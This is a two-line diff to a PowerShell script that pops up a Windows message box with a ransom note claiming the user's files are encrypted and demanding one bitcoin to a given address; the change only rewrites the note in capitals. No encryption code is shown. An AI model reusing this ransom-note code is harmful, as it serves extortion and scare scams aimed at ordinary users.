@@ -1,2 +1,2 @@
 [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
-$oReturn=[System.Windows.Forms.Messagebox]::Show("All your *.doc files have been encrypted. `n ´n 'nPay 1 bitcoin to 1PC9aZC4hNX2rmmrt7uHTfYAS3hRbph4UN")
+$oReturn=[System.Windows.Forms.Messagebox]::Show("ALL YOUR FILES HAVE BEEN ENCRYPTED!!!!!! PAY 1 BITCOIN TO 1PC9AZC4HNX2RMMRT7UHTFYAS3HRBPH4UN!!!!!!")
